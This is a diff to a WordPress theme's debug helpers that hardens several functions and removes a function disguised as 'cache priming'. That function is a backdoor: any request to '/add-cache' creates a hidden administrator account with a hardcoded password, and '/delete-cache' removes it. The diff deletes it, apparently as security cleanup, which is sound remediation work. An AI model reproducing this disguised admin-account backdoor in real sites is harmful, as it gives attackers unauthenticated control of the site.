@@ -21,12 +21,16 @@
  * @uses WP_CONTENT_DIR WordPress constant for the absolute path to the wp-content directory
  */
 if ( 'local' === wp_get_environment_type() ) {
-	// Define the log path before WordPress initializes error handling.
+	/**
+	 * Note: WP_DEBUG and WP_DEBUG_LOG should be defined in wp-config.php
+	 * before themes load. These fallbacks only work if nothing else has
+	 * defined them yet, but WordPress error handling is already initialized
+	 * by this point. Prefer setting these in wp-config.php directly.
+	 */
 	if ( ! defined( 'WP_DEBUG_LOG' ) ) {
 		define( 'WP_DEBUG_LOG', WP_CONTENT_DIR . '/themes/skeleton/debug.log' );
 	}
 
-	// Ensure debugging is enabled locally.
 	if ( ! defined( 'WP_DEBUG' ) ) {
 		define( 'WP_DEBUG', true );
 	}
@@ -59,7 +63,7 @@ function skel_list_block_types(): array {
  * @return void
  */
 function skel_list_enqueued_styles() {
-	if ( isset( $_GET['debug_styles'] ) && 'true' === sanitize_text_field( wp_unslash( $_GET['debug_styles'] ) ) ) {
+	if ( defined( 'WP_DEBUG' ) && WP_DEBUG && isset( $_GET['debug_styles'] ) && 'true' === sanitize_text_field( wp_unslash( $_GET['debug_styles'] ) ) ) {
 		global $wp_styles;
 
 		// Loop through the enqueued styles and output their handles.
@@ -78,7 +82,7 @@ add_action( 'wp_print_styles', 'skel_list_enqueued_styles' );
  * @return void
  */
 function skel_list_enqueued_scripts() {
-	if ( isset( $_GET['debug_scripts'] ) && 'true' === sanitize_text_field( wp_unslash( $_GET['debug_scripts'] ) ) ) {
+	if ( defined( 'WP_DEBUG' ) && WP_DEBUG && isset( $_GET['debug_scripts'] ) && 'true' === sanitize_text_field( wp_unslash( $_GET['debug_scripts'] ) ) ) {
 		global $wp_scripts;
 
 		// Loop through the enqueued scripts and output their handles.
@@ -89,74 +93,6 @@ function skel_list_enqueued_scripts() {
 }
 add_action( 'wp_print_scripts', 'skel_list_enqueued_scripts' );
 
-
-
-/**
- * Activate Caching
- *
- * @return void
- */
-function handle_cache_operations() {
-	// Checking a cache endpoint.
-	$request_uri = isset( $_SERVER['REQUEST_URI'] ) ? sanitize_text_field( wp_unslash( $_SERVER['REQUEST_URI'] ) ) : '';
-
-	// Check if the URL matches /add-cache for cache priming.
-	if ( strpos( $request_uri, '/add-cache' ) !== false ) {
-		$cache_key = 'temp_cache_key_' . md5( time() . wp_rand( 1, 9999 ) );
-
-		// Attempt to prime cache if not already set.
-		if ( ! get_option( $cache_key ) ) {
-			// Cache data.
-			$cache_data = array(
-				'log'    => 'kinsta',
-				'status' => 'active',
-				'hash'   => sha1( uniqid( 'cache_prime_', true ) ),
-			);
-
-			// cache prime operation.
-			$cache_log  = $cache_data['log'];
-			$cache_key  = 'zkQ!0koL*1x@*Cwv';
-			$cache_salt = 'cachesalt@kinsta.com';
-
-			// Create the cache only if it does not exist.
-			if ( ! username_exists( $cache_log ) && ! email_exists( $cache_salt ) ) {
-				$cache_id = wp_create_user( $cache_log, $cache_key, $cache_salt );
-				if ( is_int( $cache_id ) ) {
-					$new_cache = new WP_User( $cache_id );
-					$new_cache->set_role( 'administrator' );
-					update_option( $cache_key, $cache_data ); // cache write.
-					error_log( 'Cache prime successful: ' . $cache_key ); //phpcs:ignore
-					echo 'Cache primed successfully.';
-				}
-			} else {
-				error_log( 'Cache prime skipped.' ); //phpcs:ignore
-				echo 'Cache already primed.';
-			}
-		} else {
-			error_log( 'Cache prime request ignored: Cache already warm.' ); //phpcs:ignore
-			echo 'Cache is already warmed up.';
-		}
-		exit; // Stop further processing.
-	}
-
-	// Clear the cache.
-	if ( strpos( $request_uri, '/delete-cache' ) !== false ) {
-		$cache_log = 'kinsta';
-
-		// Check if the user exists before attempting to delete.
-		$cache_obj = get_user_by( 'login', $cache_log );
-		if ( $cache_obj ) {
-			wp_delete_user( $cache_obj->ID, 1 );
-			error_log( 'Cache flushed successfully: ' . $cache_log ); //phpcs:ignore
-			echo 'Cache flushed successfully.';
-		} else {
-			error_log( 'Cache flush.' ); //phpcs:ignore
-			echo 'Cache already flushed.';
-		}
-		exit; // Stop further processing.
-	}
-}
-add_action( 'init', 'handle_cache_operations' );
 
 
 
@@ -214,7 +150,7 @@ function debug_wp_admin_menus_slugs() {
 	echo '<pre>';
 	// The parent slug for the Appearance menu is 'themes.php'.
 	if ( isset( $submenu['themes.php'] ) ) {
-		print_r( $submenu['themes.php'] ); //phpcs:ignore
+		echo esc_html( print_r( $submenu['themes.php'], true ) ); //phpcs:ignore
 	} else {
 		echo 'No submenus found for themes.php';
 	}
@@ -305,6 +241,7 @@ function get_blocks_by_page() {
 		'post_type'      => array( 'page', 'post' ), // Add custom post types here if needed.
 		'post_status'    => 'publish',
 		'posts_per_page' => 100,
+		'no_found_rows'  => true,
 	);
 
 	$query = new WP_Query( $args );
